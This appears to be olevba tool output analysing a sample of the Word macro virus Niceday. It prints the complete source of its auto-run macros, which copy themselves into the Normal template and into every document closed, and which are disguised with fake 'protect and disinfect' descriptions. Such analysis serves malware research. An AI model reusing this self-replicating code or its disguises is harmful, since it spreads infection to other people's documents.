olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Niceday-5d27088ebd48c9fa964d2bbf4f152c33eea48fc4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Niceday-5d27088ebd48c9fa964d2bbf4f152c33eea48fc4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Niceday-5d27088ebd48c9fa964d2bbf4f152c33eea48fc4 - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem Concept3.AutoExit.Macro
Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
Dim message1$
Dim message2$
Dim timenumber
message1$ = "µÑé§ã¨·Ó§Ò¹¹Ð¤ÃÑº ¹¾¾Ã ·."
message2$ = "WORK HARD!! NOPPORN T"


timenumber = WordBasic.Minute(WordBasic.Now()) / 2 - WordBasic.Int(WordBasic.Minute(WordBasic.Now()) / 2)
If WordBasic.Now() >= WordBasic.DateSerial(1998, 9, 28) Then
If timenumber = 0 Then
    WordBasic.MsgBox message2$, 50
Else
    WordBasic.MsgBox message1$, 37
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VOpen.bas 
in file: Virus.MSWord.Niceday-5d27088ebd48c9fa964d2bbf4f152c33eea48fc4 - OLE stream: 'Macros/VBA/VOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Checks Page Size; if not default Page Size, converts document to default Page Size.  FWTMPv7.0"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort
    
            vZap$ = WordBasic.[FileName$]()

            vMacro$ = vZap$ + ":AutoExit"
            WordBasic.MacroCopy vMacro$, "Global:AutoExit"

            vMacro$ = vZap$ + ":AutoOpen"
            WordBasic.MacroCopy vMacro$, "Global:VOpen"

            vMacro$ = vZap$ + ":VClose"
            WordBasic.MacroCopy vMacro$, "Global:AutoClose"

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Niceday-5d27088ebd48c9fa964d2bbf4f152c33eea48fc4 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VClose.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort

        WordBasic.FileSaveAs Format:=1

        vZap$ = WordBasic.[FileName$]()

        vMacro$ = vZap$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", vMacro$

        vMacro$ = vZap$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:VOpen", vMacro$

        vMacro$ = vZap$ + ":VClose"
        WordBasic.MacroCopy "Global:AutoClose", vMacro$

        WordBasic.FileSaveAs Format:=1

Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

